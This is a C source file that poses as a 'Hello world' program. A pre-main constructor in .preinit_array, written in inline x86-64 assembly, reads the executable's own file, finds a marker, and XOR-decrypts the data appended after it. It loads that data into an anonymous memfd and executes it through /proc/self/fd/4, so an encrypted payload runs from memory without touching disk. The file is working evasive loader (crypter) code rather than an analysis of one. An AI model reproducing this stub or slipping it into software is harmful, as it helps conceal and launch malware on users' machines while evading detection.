#include <stdio.h>

static void preinit_0 (void);

void (*const preinit_array []) (void)
     __attribute__ ((section (".preinit_array"), aligned (sizeof (void *)))) =
{
  &preinit_0
};


static void preinit_0 (void)
{
    unsigned char tmp[256];
    // alloc mem
    // open file
    // get file size
    // alloc mem (file size)
    // copy file to mem
    // find constant
    // decrypt data after constant
    // run from memory
    __asm__(
        // file open
        "mov rdi, qword ptr [rsi]\n\t"
        "push 0x2\n\t"
        "mov rax, qword ptr [rsp]\n\t"
        "pop r11\n\t"
        "xor rsi, rsi\n\t"
        "xor rdx, rdx\n\t"
        "syscall\n\t"
        "mov r13, rax\n\t"
        // get file size
        "mov rdi, rax\n\t"
        "push 0x5\n\t"
        "mov rax, qword ptr [rsp]\n\t"
        "pop r11\n\t"
        "mov rsi, rsp\n\t"
        "syscall\n\t"
        "mov rax, qword ptr [rsp+0x30]\n\t"
        // now rax is size of file
        // alloc mem
        "mov rsi, rax\n\t"
        "xor r9, r9\n\t"
        "xor r8, r8\n\t"
        "xor rdi, rdi\n\t"
        "push 9\n\t"
        "mov rax, qword ptr [rsp]\n\t"
        "push 3\n\t"
        "pop rdx\n\t"
        "push 0x22\n\t"
        "pop r10\n\t"
        "syscall\n\t"
        "pop r11\n\t"
        // now rax is a pointer to memory blob
        // read data to blob
        "mov rdi, r13\n\t"
        "mov rdx, rsi\n\t"
        "mov rsi, rax\n\t"
        "push 0\n\t"
        "mov rax, qword ptr [rsp]\n\t"
        "syscall\n\t"
        "pop r11\n\t"
        "xor rdi, rdi\n\t"
        "mov r11, rdx\n\t"
        "xor r8, r8\n\t"
        "start:"
        "cmp r11, rdi\n\t"
        "jle end\n\t"
        "cmp r8, 0\n\t"
        "jg decrypt\n\t"
        "mov rax, qword ptr [rsi + rdi]\n\t"
        "xor rax, 0xe7e4e2\n\t"
        "ror rax, 24\n\t"
        "xor rax, 0xd4d2e5\n\t"
        "ror rax, 24\n\t"
        "xor rax, 0xd4e5\n\t"
        "add rdi, 8\n\t"
        "test rax, rax\n\t"
        "jne start\n\t"
        "mov r8, rdi\n\t"
        "mov eax, 1\n\t"
        "mov ecx, 2190262207\n\t"
        "decrypt:\n\t"
        "xor byte ptr [rsi + rdi], al\n\t"
        "movzx eax, al\n\t"
        "lea     edx, [rax+rax*4]\n\t"
        "lea     edx, [rax+rdx*2]\n\t"
        "mov     rax, rdx\n\t"
        "imul    rdx, rcx\n\t"
        "shr     rdx, 39\n\t"
        "imul    edx, edx, 251\n\t"
        "sub     eax, edx\n\t"
        "inc rdi\n\t"
        "jmp start\n\t"
        "end:\n\t"
        "push 0x13f\n\t"
        "mov rax, qword ptr[rsp]\n\t"
        "pop r11\n\t"
        "mov r10, rsi\n\t"
        "mov qword ptr[rsp], 0x0\n\t"
        "mov rdi, rsp\n\t"
        "mov rsi, 0x1\n\t"
        "syscall\n\t"
        "mov rdi, rax\n\t"
        "mov rsi, r10\n\t"
        "add rsi, r8\n\t"
        "mov rdx, qword ptr [rsp+0x30]\n\t"
        "sub rdx, r8\n\t"
        "push 1\n\t"
        "mov rax, qword ptr[rsp]\n\t"
        "pop r10\n\t"
        "syscall\n\t"
        "mov dword ptr[rsp], 0x6f72702f\n\t"
        "mov dword ptr[rsp+4], 0x65732f63\n\t"
        "mov dword ptr[rsp+8], 0x662f666c\n\t"
        "mov dword ptr[rsp+12], 0x00342f64\n\t"
        "mov rdi, rsp\n\t"
/*        "push 0x39\n\t"
        "mov rax, qword ptr[rsp]\n\t"
        "pop r10\n\t"
        "syscall\n\t"
        "cmp rax, 0\n\t"
        "jg close\n\t"*/
        "push 0x3b\n\t"
        "mov rax, qword ptr[rsp]\n\t"
        "xor rsi, rsi\n\t"
        "xor rdx, rdx\n\t"
        "syscall\n\t"
        "close:"
    );
};

int main() {
    puts("Hello world!");
    return 0;
}